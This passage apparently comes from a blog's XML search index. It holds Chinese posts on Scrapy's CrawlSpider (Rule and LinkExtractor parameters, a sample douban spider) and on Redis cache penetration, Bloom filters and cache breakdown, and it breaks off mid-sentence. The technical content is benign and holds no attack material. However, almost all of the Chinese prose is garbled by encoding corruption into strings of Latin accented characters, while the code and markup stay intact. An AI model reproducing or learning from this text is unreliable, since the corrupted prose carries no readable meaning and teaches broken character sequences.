ï¼Œæœ‰å¾ˆå¤šä¸€éƒ¨åˆ†æ—¶é—´éƒ½å¯»æ‰¾ä¸‹ä¸€é¡µçš„urlåœ°å€æˆ–è€…å†…å®¹çš„urlåœ°å€ä¸Šé¢ï¼Œè€Œè¿™ä¸ªè¿‡ç¨‹èƒ½æ›´ç®€å•å—ï¼Ÿ</p><p>éœ€æ±‚æ€è·¯ï¼š</p><ol><li>ä»responseä¸­æå–æ‰€æœ‰çš„æ»¡è¶³è§„åˆ™çš„urlåœ°å€</li><li>è‡ªåŠ¨çš„æ„é€ è‡ªå·±requestsè¯·æ±‚ï¼Œå‘é€ç»™å¼•æ“</li></ol><p>è€Œ<code>crawlspider</code>å°±å¯ä»¥æ»¡è¶³ä¸Šè¿°éœ€æ±‚ï¼Œèƒ½å¤ŸåŒ¹é…æ»¡è¶³æ¡ä»¶çš„urlåœ°å€ï¼Œç»„è£…æˆReuqestå¯¹è±¡åè‡ªåŠ¨å‘é€ç»™å¼•æ“ï¼Œ åŒæ—¶èƒ½å¤ŸæŒ‡å®šcallbackå‡½æ•°ï¼Œ</p><p>å³ï¼š<u>crawlspiderçˆ¬è™«å¯ä»¥æŒ‰ç…§è§„åˆ™è‡ªåŠ¨è·å–è¿æ¥</u></p><div class="note info no-icon flat"><p>Scrapyæ¡†æ¶ä¸­åˆ†ä¸¤ç±»çˆ¬è™«ï¼ŒSpiderç±»å’ŒCrawlSpiderç±»ã€‚CrawlSpiderç»§æ‰¿è‡ªspiderï¼Œåªä¸è¿‡æ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå¢åŠ äº†æ–°çš„åŠŸèƒ½ã€‚å¯ä»¥å®šä¹‰çˆ¬å–çš„urlçš„è§„åˆ™ï¼Œä»¥åscrapyç¢°åˆ°æ»¡è¶³æ¡ä»¶çš„urléƒ½è¿›è¡Œçˆ¬å–ï¼Œè€Œä¸ç”¨æ‰‹åŠ¨yield Requestã€‚</p></div><h2 id="åˆ›å»ºcrawlspiderçˆ¬è™«å¹¶è§‚å¯Ÿçˆ¬è™«å†…çš„é»˜è®¤å†…å®¹">åˆ›å»ºcrawlspiderçˆ¬è™«å¹¶è§‚å¯Ÿçˆ¬è™«å†…çš„é»˜è®¤å†…å®¹</h2><p><strong>ä¸€ã€åˆ›å»ºcrawlspiderçˆ¬è™«ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider -t crawl douban movie.douban.com</span><br></pre></td></tr></table></figure><p><strong>äºŒã€spiderä¸­é»˜è®¤ç”Ÿæˆçš„å†…å®¹å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubnSpider</span>(<span class="params">CrawlSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;Items/&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        <span class="comment">#item[&#x27;domain_id&#x27;] = response.xpath(&#x27;//input[@id=&quot;sid&quot;]/@value&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;name&#x27;] = response.xpath(&#x27;//div[@id=&quot;name&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;description&#x27;] = response.xpath(&#x27;//div[@id=&quot;description&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p><strong>ä¸‰ã€è§‚å¯Ÿå…¶ä¸è·Ÿæ™®é€šçš„scrapy.spiderçš„åŒºåˆ«</strong></p><div class="note danger flat"><p>åœ¨crawlspiderçˆ¬è™«ä¸­ï¼Œæ²¡æœ‰parseå‡½æ•°</p></div><p>é‡ç‚¹åœ¨<code>rules</code>ä¸­ï¼š</p><ol><li>rulesæ˜¯ä¸€ä¸ªå…ƒç»„æˆ–è€…æ˜¯åˆ—è¡¨ï¼ŒåŒ…å«çš„æ˜¯Ruleå¯¹è±¡</li><li>Ruleè¡¨ç¤ºè§„åˆ™ï¼Œå…¶ä¸­åŒ…å«LinkExtractorï¼Œcallbackå’Œfollowç­‰å‚æ•°</li><li>LinkExtractor:è¿æ¥æå–å™¨ï¼Œå¯ä»¥é€šè¿‡<code>æ­£åˆ™</code>æˆ–è€…æ˜¯<code>xpath</code>æ¥è¿›è¡Œurlåœ°å€çš„åŒ¹é…</li><li>callback :è¡¨ç¤ºç»è¿‡è¿æ¥æå–å™¨æå–å‡ºæ¥çš„urlåœ°å€å“åº”çš„å›è°ƒå‡½æ•°ï¼Œå¯ä»¥æ²¡æœ‰ï¼Œæ²¡æœ‰è¡¨ç¤ºå“åº”ä¸ä¼šè¿›è¡Œå›è°ƒå‡½æ•° çš„å¤„ç†</li><li>followï¼šè¿æ¥æå–å™¨æå–çš„urlåœ°å€å¯¹åº”çš„å“åº”æ˜¯å¦è¿˜ä¼šç»§ç»­è¢«rulesä¸­çš„è§„åˆ™è¿›è¡Œæå–ï¼ŒTrueè¡¨ç¤ºä¼šï¼ŒFlaseè¡¨ç¤ºä¸ä¼š</li></ol><p><strong>å››ã€crawlspiderä½¿ç”¨çš„æ³¨æ„ç‚¹</strong></p><ol><li>é™¤äº†ç”¨å‘½ä»¤ <code>scrapy genspider -t crawl &lt;çˆ¬è™«å&gt;  &lt;allowed_domail&gt;</code>åˆ›å»ºä¸€ä¸ªcrawlspiderçš„æ¨¡æ¿ï¼Œé¡µå¯ä»¥æ‰‹åŠ¨åˆ›å»º</li><li>crawlspiderä¸­<code>ä¸èƒ½</code>å†æœ‰ä»¥<code>parse</code>ä¸ºåçš„æ•°æ®æå–æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¢«crawlspiderç”¨æ¥å®ç°åŸºç¡€urlæå–ç­‰åŠŸèƒ½</li><li>Ruleå¯¹è±¡ä¸­LinkExtractorä¸ºå›ºå®šå‚æ•°ï¼Œå…¶ä»–callbackã€followä¸ºå¯é€‰å‚æ•°</li><li>ä¸æŒ‡å®šcallbackä¸”followä¸ºTrueçš„æƒ…å†µä¸‹ï¼Œæ»¡è¶³rulesä¸­è§„åˆ™çš„urlè¿˜ä¼šè¢«ç»§ç»­æå–å’Œè¯·æ±‚</li><li>å¦‚æœä¸€ä¸ªè¢«æå–çš„urlæ»¡è¶³å¤šä¸ªRuleï¼Œé‚£ä¹ˆä¼šä»rulesä¸­é€‰æ‹©ä¸€ä¸ªæ»¡è¶³åŒ¹é…æ¡ä»¶çš„Ruleæ‰§è¡Œ</li></ol><p><strong>äº”ã€crawlspiderå…¶ä»–çŸ¥è¯†ç‚¹çš„äº†è§£</strong></p><ol><li>é“¾æ¥æå–å™¨<code>LinkExtractor</code>çš„æ›´å¤šå¸¸è§å‚æ•°<ul><li>allowï¼šæ»¡è¶³æ‹¬å·ä¸­çš„â€™reâ€™è¡¨è¾¾å¼çš„urlä¼šè¢«æå–ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™å…¨éƒ¨åŒ¹é…</li><li>denyï¼šæ»¡è¶³æ‹¬å·ä¸­çš„â€™reâ€™è¡¨è¾¾å¼çš„urlä¸ä¼šè¢«æå–ï¼Œä¼˜å…ˆçº§é«˜äºallow</li><li>allow_domainsï¼šä¼šè¢«æå–çš„é“¾æ¥çš„domains(urlèŒƒå›´)ï¼Œå¦‚ï¼š [â€˜<a href="http://hr.tencent.com">hr.tencent.com</a>â€™, â€˜<a href="http://baidu.com">baidu.com</a>â€™]</li><li>deny_domainsï¼šä¸ä¼šè¢«æå–çš„é“¾æ¥çš„domains(urlèŒƒå›´)</li><li>restrict_xpathsï¼šä½¿ç”¨xpathè§„åˆ™è¿›è¡ŒåŒ¹é…ï¼Œå’Œallowå…±åŒè¿‡æ»¤urlï¼Œå³xpathæ»¡è¶³çš„èŒƒå›´å†…çš„urlåœ°å€ä¼šè¢« æå–ï¼Œå¦‚ï¼š restrict_xpaths=â€˜//div[@class=â€œpagenavâ€]â€™</li></ul></li><li><code>Rule</code>å¸¸è§å‚æ•°<ul><li>LinkExtractorï¼šé“¾æ¥æå–å™¨ï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™æˆ–è€…æ˜¯xpathæ¥è¿›è¡Œurlåœ°å€çš„åŒ¹é…</li><li>callbackï¼šè¡¨ç¤ºç»è¿‡è¿æ¥æå–å™¨æå–å‡ºæ¥çš„urlåœ°å€å“åº”çš„å›è°ƒå‡½æ•°ï¼Œå¯ä»¥æ²¡æœ‰ï¼Œæ²¡æœ‰è¡¨ç¤ºå“åº”ä¸ä¼šè¿›è¡Œå›è°ƒ å‡½æ•°çš„å¤„ç†</li><li>followï¼šè¿æ¥æå–å™¨æå–çš„urlåœ°å€å¯¹åº”çš„å“åº”æ˜¯å¦è¿˜ä¼šç»§ç»­è¢«rulesä¸­çš„è§„åˆ™è¿›è¡Œæå–ï¼Œé»˜è®¤Trueè¡¨ç¤ºä¼šï¼Œ Flaseè¡¨ç¤ºä¸ä¼š</li><li>process_linksï¼šå½“é“¾æ¥æå–å™¨LinkExtractorè·å–åˆ°é“¾æ¥åˆ—è¡¨çš„æ—¶å€™è°ƒç”¨è¯¥å‚æ•°æŒ‡å®šçš„æ–¹æ³•ï¼Œè¿™ä¸ªè‡ªå®šä¹‰æ–¹ æ³•å¯ä»¥ç”¨æ¥è¿‡æ»¤urlï¼Œä¸”è¿™ä¸ªæ–¹æ³•æ‰§è¡Œåæ‰ä¼šæ‰§è¡ŒcallbackæŒ‡å®šçš„æ–¹æ³•</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> çˆ¬è™« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rediså­¦ä¹ ç¬”è®°ï¼ˆ3ï¼‰</title>
      <link href="/posts/6cb57fa2/"/>
      <url>/posts/6cb57fa2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>Redisåº”ç”¨é—®é¢˜</h1><h2 id="å‰è¨€">å‰è¨€</h2><p>ç”¨æˆ·çš„æ•°æ®ä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨äºæ•°æ®åº“ä¸­ï¼Œæ•°æ®åº“çš„æ•°æ®æ˜¯è½åœ¨ç£ç›˜ä¸Šçš„ï¼Œç£ç›˜çš„è¯»å†™é€Ÿåº¦å¯ä»¥è¯´æ˜¯è®¡ç®—æœºé‡Œç¡¬ä»¶ä¸­æœ€æ…¢çš„äº†ã€‚</p><p>å½“ç”¨æˆ·çš„è¯·æ±‚ï¼Œéƒ½è®¿é—®æ•°æ®åº“çš„è¯ï¼Œè¯·æ±‚æ•°é‡ä¸€ä¸Šæ¥ï¼Œæ•°æ®åº“å¾ˆå®¹æ˜“å°±å´©æºƒï¼Œæ‰€ä»¥ä¸ºäº†é¿å…ç”¨æˆ·ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œä¼šç”¨<code>Redis</code>ä½œä¸º<code>ç¼“å­˜å±‚</code>ã€‚</p><p><code>Redis</code>æ˜¯å†…å­˜æ•°æ®åº“ï¼Œå°†æ•°æ®åº“çš„æ•°æ®ç¼“å­˜åœ¨<code>Redis</code>ä¸­ï¼Œç›¸å½“äºæ•°æ®ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œå†…å­˜çš„è¯»å†™é€Ÿåº¦æ¯”ç¡¬ç›˜å¿«å¥½å‡ ä¸ªæ•°é‡çº§ï¼Œè¿™ä¹Ÿå¤§å¤§æé«˜äº†ç³»ç»Ÿæ€§èƒ½ã€‚</p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/ç¼“å­˜å±‚ä¸å­˜å‚¨å±‚.id06cl9w4q8.png" alt="ç¼“å­˜å±‚ä¸å­˜å‚¨å±‚" style="zoom: 67%;" /><p>å¼•å…¥äº†ç¼“å­˜å±‚ï¼Œéšä¹‹è€Œæ¥çš„æ˜¯æœ‰å…³ç¼“å­˜å¼‚å¸¸çš„ä¸€äº›é—®é¢˜ï¼š<code>ç¼“å­˜ç©¿é€</code>ã€<code>ç¼“å­˜å‡»ç©¿</code>ã€<code>ç¼“å­˜é›ªå´©</code>ã€<code>ç¼“å­˜é¢ ç°¸</code>ã€<code>ç¼“å­˜é¢„çƒ­</code>ã€<code>ç¼“å­˜é™çº§</code>â€¦è€Œå‰ä¸‰ä¸ªä¹Ÿæ­£æ˜¯æœ‰äº›ä¼ä¸šé¢è¯•ç»å¸¸è€ƒå¯Ÿçš„é—®é¢˜ã€‚</p><h2 id="ç¼“å­˜ç©¿é€">ç¼“å­˜ç©¿é€</h2><h3 id="æ¦‚å¿µ">æ¦‚å¿µ</h3><p><code>ç¼“å­˜å±‚</code>å’Œ<code>æ•°æ®åº“</code>ä¸­<code>éƒ½æ²¡æœ‰</code>çš„æ•°æ®ï¼Œè€Œç”¨æˆ·ä¸æ–­å‘èµ·è¯·æ±‚ï¼Œå¯¼è‡´è¯·æ±‚åœ¨è®¿é—®ç¼“å­˜æ—¶ï¼Œå‘ç°ç¼“å­˜ç¼ºå¤±ï¼Œå†å»è®¿é—®æ•°æ®åº“ï¼Œå¦‚æœä»æ•°æ®åº“ä¸­æŸ¥ä¸åˆ°è¯¥æ•°æ®åˆ™ä¸å†™å…¥ç¼“å­˜ï¼Œè¿™å°†å¯¼è‡´è¿™ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ°å­˜å‚¨å±‚å»æŸ¥è¯¢ï¼Œå¤±å»äº†ç¼“å­˜ä¿æŠ¤åç«¯æŒä¹…çš„æ„ä¹‰ã€‚</p><p>è€Œæˆ‘ä»¬æ•°æ®åº“çš„ id éƒ½æ˜¯1å¼€å§‹è‡ªå¢ä¸Šå»çš„ï¼Œå¦‚å‘èµ·ä¸ºidå€¼ä¸º -1 çš„æ•°æ®æˆ– id ä¸ºç‰¹åˆ«å¤§ä¸å­˜åœ¨çš„æ•°æ®ã€‚è¿™æ—¶çš„ç”¨æˆ·å¾ˆå¯èƒ½æ˜¯æ”»å‡»è€…ï¼Œæ”»å‡»ä¼šå¯¼è‡´æ•°æ®åº“å‹åŠ›è¿‡å¤§ï¼Œä¸¥é‡ä¼šå‡»å®æ•°æ®åº“ã€‚</p><h3 id="é€ æˆåŸå› ">é€ æˆåŸå› </h3><ol><li>è‡ªèº«ä¸šåŠ¡ä»£ç æˆ–è€…æ•°æ®å‡ºç°é—®é¢˜ï¼ˆä¾‹å¦‚ï¼šset å’Œ get çš„keyä¸ä¸€è‡´ï¼Œæ•°æ®è¢«è¯¯åˆ é™¤ï¼‰</li><li>ä¸€äº›æ¶æ„æ”»å‡»ã€çˆ¬è™«ç­‰é€ æˆå¤§é‡ç©ºå‘½ä¸­ï¼ˆçˆ¬å–çº¿ä¸Šå•†åŸå•†å“æ•°æ®ï¼Œè¶…å¤§å¾ªç¯é€’å¢å•†å“çš„IDï¼‰</li></ol><h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3><p><strong>ä¸€ã€éæ³•è¯·æ±‚çš„é™åˆ¶</strong></p><p>å½“æœ‰å¤§é‡æ¶æ„è¯·æ±‚è®¿é—®ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¹Ÿä¼šå‘ç”Ÿç¼“å­˜ç©¿é€ï¼Œå› æ­¤åœ¨APIå…¥å£å¤„æˆ‘ä»¬è¦<code>åˆ¤æ–­è¯·æ±‚å‚æ•°æ˜¯å¦åˆç†ï¼Œè¯·æ±‚å‚æ•°æ˜¯å¦å«æœ‰éæ³•å­—ç¬¦ã€è¯·æ±‚å­—æ®µæ˜¯å¦å­˜åœ¨</code>ï¼Œå¦‚æœåˆ¤æ–­å‡ºæ˜¯æ¶æ„è¯·æ±‚å°±ç›´æ¥è¿”å›é”™è¯¯ï¼Œé¿å…è¿›ä¸€æ­¥è®¿é—®ç¼“å­˜å±‚å’Œæ•°æ®åº“ã€‚</p><p><strong>äºŒã€ç¼“å­˜ç©ºå¯¹è±¡</strong></p><p>ç¼“å­˜ç©ºå¯¹è±¡ï¼šæ˜¯æŒ‡åœ¨æŒä¹…å±‚æ²¡æœ‰å‘½ä¸­çš„æƒ…å†µä¸‹ï¼Œå¯¹keyè¿›è¡Œset ï¼ˆkey,nullï¼‰</p><p>ç¼“å­˜ç©ºå¯¹è±¡ä¼šæœ‰<code>ä¸¤ä¸ªé—®é¢˜</code>ï¼š</p><p>ç¬¬ä¸€ï¼Œvalueä¸ºnullä¸ä»£è¡¨ä¸å ç”¨å†…å­˜ç©ºé—´ï¼Œç©ºå€¼åšäº†ç¼“å­˜ï¼Œæ„å‘³ç€ç¼“å­˜å±‚ä¸­å­˜äº†æ›´å¤šçš„é”®ï¼Œéœ€è¦æ›´å¤šçš„å†…å­˜ç©ºé—´ï¼Œ<code>æ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•</code>æ˜¯é’ˆå¯¹è¿™ç±»æ•°æ®è®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´ï¼Œè®©å…¶è‡ªåŠ¨å‰”é™¤ã€‚</p><p>ç¬¬äºŒï¼Œç¼“å­˜å±‚å’Œå­˜å‚¨å±‚çš„æ•°æ®ä¼šæœ‰ä¸€æ®µæ—¶é—´çª—å£çš„<code>ä¸ä¸€è‡´</code>ï¼Œå¯èƒ½ä¼šå¯¹ä¸šåŠ¡æœ‰ä¸€å®šå½±å“ã€‚</p><p>ä¾‹å¦‚è¿‡æœŸæ—¶é—´è®¾ç½®ä¸º5åˆ†é’Ÿï¼Œå¦‚æœæ­¤æ—¶å­˜å‚¨å±‚æ·»åŠ äº†è¿™ä¸ªæ•°æ®ï¼Œé‚£è¿™æ®µæ—¶é—´å†…å°±ä¼šå‡ºç°ç¼“å­˜å±‚å’Œå­˜å‚¨å±‚æ•°æ®çš„ä¸ä¸€è‡´ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨<code>æ¶ˆæ¯ç³»ç»Ÿ</code>æˆ–è€…å…¶ä»–æ–¹å¼æ¸…é™¤æ‰ç¼“å­˜å±‚ä¸­çš„ç©ºå¯¹è±¡</p><p><strong>ä¸‰ã€å¸ƒéš†è¿‡æ»¤å™¨(Bloom Filter)æ‹¦æˆª</strong></p><p>å¸ƒéš†è¿‡æ»¤å™¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„<code>äºŒè¿›åˆ¶å‘é‡</code>å’Œä¸€ç³»åˆ—<code>éšæœºæ˜ å°„å‡½æ•°</code>ï¼Œå…¶å®ä¹Ÿå¯ä»¥è¯´æ˜¯ç”±<code>åˆå§‹å€¼éƒ½ä¸º0çš„ä½å›¾æ•°ç»„</code>å’Œ<code>Nä¸ªå“ˆå¸Œå‡½æ•°</code>ä¸¤éƒ¨åˆ†ç»„æˆçš„ã€‚å¸ƒéš†è¿‡æ»¤å™¨å¯ä»¥ç”¨äºæ£€ç´¢ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ä¸€ä¸ªé›†åˆä¸­ã€‚</p><p>ä¼˜ç‚¹æ˜¯ç©ºé—´æ•ˆç‡å’ŒæŸ¥è¯¢æ—¶é—´éƒ½è¿œè¿œè¶…è¿‡ä¸€èˆ¬çš„ç®—æ³•ï¼Œç¼ºç‚¹æ˜¯æœ‰ä¸€å®šçš„è¯¯è¯†åˆ«ç‡å’Œåˆ é™¤å›°éš¾ã€‚</p><p>åœ¨å†™å…¥æ•°æ®åº“æ•°æ®æ—¶ï¼Œå°†å­˜åœ¨çš„keyä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨<code>æ ‡è®°ä¸€ä¸‹</code>ï¼Œç„¶ååœ¨ç”¨æˆ·è¯·æ±‚åˆ°æ¥æ—¶ï¼Œä¸šåŠ¡çº¿ç¨‹ç¡®è®¤ç¼“å­˜å¤±æ•ˆåï¼Œå¯ä»¥<code>é€šè¿‡æŸ¥è¯¢å¸ƒéš†è¿‡æ»¤å™¨å¿«é€Ÿåˆ¤æ–­æ•°æ®æ˜¯å¦å­˜åœ¨</code>ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±ä¸ç”¨é€šè¿‡æŸ¥è¯¢æ•°æ®åº“æ¥åˆ¤æ–­æ•°æ®æ˜¯å¦å­˜åœ¨ã€‚</p><p>å³ä½¿å‘ç”Ÿäº†ç¼“å­˜ç©¿é€ï¼Œå¤§é‡è¯·æ±‚åªä¼šæŸ¥è¯¢<code>Redis</code>å’Œ<code>å¸ƒéš†è¿‡æ»¤å™¨</code>ï¼Œè€Œä¸ä¼šæŸ¥è¯¢æ•°æ®åº“ï¼Œè¿™å°±æ‹¦æˆªäº†å¾ˆå¤šæ³¨å®šæ²¡æœ‰ç»“æœçš„æŸ¥è¯¢ï¼Œé™ä½äº†æ•°æ®åº“çš„è´Ÿè½½ï¼Œä¿è¯äº†æ•°æ®åº“æ­£å¸¸è¿è¡Œã€‚</p><p>å¸ƒéš†è¿‡æ»¤å™¨ä¼šé€šè¿‡<code>3ä¸ªæ“ä½œ</code>å®Œæˆæ ‡è®°ï¼š</p><ol><li>ä½¿ç”¨Nä¸ªå“ˆå¸Œå‡½æ•°åˆ†åˆ«å¯¹æ•°æ®åšå“ˆå¸Œè®¡ç®—ï¼Œå¾—åˆ°Nä¸ªå“ˆå¸Œå€¼ï¼›</li><li>å°†ç¬¬ä¸€æ­¥å¾—åˆ°çš„Nä¸ªå“ˆå¸Œå€¼å¯¹ä½å›¾æ•°ç»„çš„é•¿åº¦å–æ¨¡ï¼Œå¾—åˆ°æ¯ä¸ªå“ˆå¸Œå€¼åœ¨ä½å›¾æ•°ç»„çš„å¯¹åº”ä½ç½®ï¼›</li><li>å°†æ¯ä¸ªå“ˆå¸Œå€¼åœ¨ä½å›¾æ•°ç»„çš„å¯¹åº”ä½ç½®çš„å€¼è®¾ç½®ä¸º1ï¼›</li></ol><p>ä¸¾ä¸ªæ —å­ï¼šå‡è®¾æœ‰ä¸€ä¸ªä½å›¾æ•°ç»„é•¿åº¦ä¸º 8ï¼Œå“ˆå¸Œå‡½æ•° 3 ä¸ªçš„å¸ƒéš†è¿‡æ»¤å™¨ã€‚<br></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BE%8B%E5%AD%90.4jkr5jfjjme0.png" alt="å¸ƒéš†è¿‡æ»¤å™¨ä¾‹å­"></p><p><br>åœ¨æ•°æ®åº“å†™å…¥æ•°æ® x åï¼ŒæŠŠæ•°æ® x æ ‡è®°åœ¨å¸ƒéš†è¿‡æ»¤å™¨æ—¶ï¼Œæ•°æ® x ä¼šè¢« 3 ä¸ªå“ˆå¸Œå‡½æ•°åˆ†åˆ«è®¡ç®—å‡º 3 ä¸ªå“ˆå¸Œå€¼ï¼Œç„¶ååœ¨å¯¹è¿™ 3 ä¸ªå“ˆå¸Œå€¼å¯¹ 8 å–æ¨¡ï¼Œå‡è®¾å–æ¨¡çš„ç»“æœä¸º 1ã€4ã€6ï¼Œç„¶åæŠŠä½å›¾æ•°ç»„çš„ç¬¬ 1ã€4ã€6 ä½ç½®çš„å€¼è®¾ç½®ä¸º 1ã€‚<strong>å½“åº”ç”¨è¦æŸ¥è¯¢æ•°æ® x æ˜¯å¦æ•°æ®åº“æ—¶ï¼Œé€šè¿‡å¸ƒéš†è¿‡æ»¤å™¨åªè¦æŸ¥åˆ°ä½å›¾æ•°ç»„çš„ç¬¬ 1ã€4ã€6 ä½ç½®çš„å€¼æ˜¯å¦å…¨ä¸º 1ï¼Œåªè¦æœ‰ä¸€ä¸ªä¸º 0ï¼Œå°±è®¤ä¸ºæ•°æ® x ä¸åœ¨æ•°æ®åº“ä¸­</strong>ã€‚</p><p>å¸ƒéš†è¿‡æ»¤å™¨ç”±äºæ˜¯åŸºäº<code>å“ˆå¸Œå‡½æ•°</code>å®ç°æŸ¥æ‰¾çš„ï¼Œé«˜æ•ˆæŸ¥æ‰¾çš„åŒæ—¶<code>å­˜åœ¨å“ˆå¸Œå†²çªçš„å¯èƒ½æ€§</code>ï¼Œæ¯”å¦‚æ•°æ® x å’Œæ•°æ® y å¯èƒ½éƒ½è½åœ¨ç¬¬ 1ã€4ã€6 ä½ç½®ï¼Œè€Œäº‹å®ä¸Šï¼Œå¯èƒ½æ•°æ®åº“ä¸­å¹¶ä¸å­˜åœ¨æ•°æ® yï¼Œå­˜åœ¨è¯¯åˆ¤çš„æƒ…å†µã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>æŸ¥è¯¢å¸ƒéš†è¿‡æ»¤å™¨è¯´æ•°æ®å­˜åœ¨ï¼Œå¹¶ä¸ä¸€å®šè¯æ˜æ•°æ®åº“ä¸­å­˜åœ¨è¿™ä¸ªæ•°æ®ï¼Œä½†æ˜¯æŸ¥è¯¢åˆ°æ•°æ®ä¸å­˜åœ¨ï¼Œæ•°æ®åº“ä¸­ä¸€å®šå°±ä¸å­˜åœ¨è¿™ä¸ªæ•°æ®</strong>ã€‚è™½æœ‰ä¸€å®šçš„è¯¯è¯†åˆ«ç‡ï¼Œä½†æ²¡æœ‰è¯†åˆ«é”™è¯¯çš„æƒ…å½¢ã€‚</p><div class="note info flat"><p>å¸ƒéš†è¿‡æ»¤å™¨é€‚ç”¨åœºæ™¯ï¼šçˆ¬è™«ç³»ç»Ÿurlå»é‡ã€åƒåœ¾é‚®ä»¶è¿‡æ»¤ã€é»‘åå•â€¦</p></div><h2 id="ç¼“å­˜å‡»ç©¿">ç¼“å­˜å‡»ç©¿</h2><h3 id="æ¦‚å¿µ-2">æ¦‚å¿µ</h3><p>å­˜åœ¨<code>æŸä¸ª</code>çƒ­ç‚¹æ•°æ®keyï¼Œä¾‹å¦‚å•†åŸç§’æ€æ´»åŠ¨ã€çƒ­æœç­‰ç­‰ã€‚</p><p>ç”¨æˆ·<code>å¤§å¹¶å‘é›†ä¸­</code>å¯¹è¿™ä¸€ä¸ª<code>key</code>è¿›è¡Œè®¿é—®ï¼Œ<code>ç¼“å­˜å±‚</code>åœ¨ä¸åœåœ°æ‰›ç€å¤§å¹¶å‘ï¼Œè€Œå½“è¿™ä¸ª key åœ¨<code>å¤±æ•ˆè¿‡æœŸ</code>çš„ç¬é—´ï¼Œ<code>æŒç»­</code>çš„<code>å¤§å¹¶å‘</code>å°±ä¼šç©¿ç ´ç¼“å­˜å±‚ï¼Œç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œæ­¤æ—¶å°±åƒåœ¨ä¸€ä¸ªå®Œå¥½æ— æŸçš„æ¡¶ä¸Šå‡¿å¼€äº†ä¸€ä¸ªæ´ã€‚</p><p>å½“å‘ç”Ÿç¼“å­˜å‡»ç©¿çš„æ—¶å€™ï¼Œæ•°æ®åº“çš„æŸ¥è¯¢å‹åŠ›ä¼šå€å¢ï¼Œå¯¼è‡´å¤§é‡çš„è¯·æ±‚é˜»å¡ã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ-2">è§£å†³æ–¹æ¡ˆ</h3><p><strong>ä¸€ã€é¢„å…ˆè®¾ç½®çƒ­ç‚¹æ•°æ®</strong></p><p>åœ¨Redisé«˜å³°è®¿é—®ä¹‹å‰ï¼ŒæŠŠä¸€äº›çƒ­ç‚¹æ•°æ®æå‰å­˜å…¥redisä¸­ï¼Œå¢åŠ 